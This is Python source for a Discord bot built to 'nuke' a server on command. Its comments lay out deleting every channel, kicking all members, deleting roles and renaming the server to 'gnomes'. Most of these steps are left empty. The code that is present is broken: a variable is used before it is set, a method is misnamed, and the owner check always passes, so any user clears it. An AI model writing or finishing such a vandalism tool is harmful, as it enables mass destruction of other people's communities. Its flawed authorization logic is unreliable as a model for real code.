import discord
from discord.ext import commands
from discord.utils import get
from myInfo import getToken


description = '''A pretty awesome bot with everyday commands that will make your life easier!
'''

bot = commands.Bot(command_prefix=';', description=description)
bot.remove_command('help')

authorisation_id = 0

print("Attempting to connect to discord's servers...")


@bot.event
async def on_ready():
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('------')


async def nuke_this_server(ctx):
    # Step 1: Delete all channels


    # Step 2: Kick all members where possible


    # Step 3: Delete all roles


    # Step 4: Change server image and server name
    # with open('image.jpg', 'rb') as f:
    #     icon = f.read()
    # await ctx.edit(ctx.message.server, icon=icon)
    await guild.creedit(ctx.message.server, name="gnomes")

    # Step 5: Create text-channel
    guild = ctx.message.guild
    await guild.create_text_channel("youve-been-gnomed!")

    # Step 6: Send message in channel





    # await channel.send("You've been gnomed! Congratulations! \n"
    #                    "This bot is a service to nuke servers so, \n"
    #                    "If you are Kim Jong Un, feel free to use this!")


async def is_owner(ctx):

    # 241062161059676161 = Daniel
    # 274644114312527872 = Ceniken

    if ctx.author.id == 241062161059676161 or 274644114312527872:
        return True
    else:
        return False


@bot.command()
async def nuke(ctx):
    global authorisation_id
    authorisation_id = 0
    ownerState = await is_owner(ctx)
    if ownerState is True:
        await ctx.send("Please confirm you want to use this. \n"
                 "This bot is not responsible for any damages caused. \n"
                 "If you are sure, type `;agree` within 30 seconds.")
        authorisation_id = 1

    elif ownerState is False:
        await ctx.send("You are not authorised to use this command. \n"
                 "The owner has been requested to approve this request within 30 seconds.")
        user = bot.get_user(241062161059676161)
        authorUser = bot.get_user(ctx.author.id)
        await user.send('The user "{author}", has requested to nuke the server "{serverName}". \n'
                        'If you would like to confirm this, Please type `;agree`'.format(author=authorUser,
                                                                                         serverName=ctx.guild.name))

        authorisation_id = 1


@bot.command()
async def agree(ctx):
    global authorisation_id
    authorisedState = await is_owner(ctx)

    if authorisedState is True:
        if authorisation_id == 0:
            await ctx.send("No request has been found.")
        elif authorisation_id == 1:
            await ctx.send("Request accepted")
            await nuke_this_server(ctx)
    elif authorisation_id is False:
        await ctx.send("You do not have permissions to accept requests.")


bot.run(getToken())
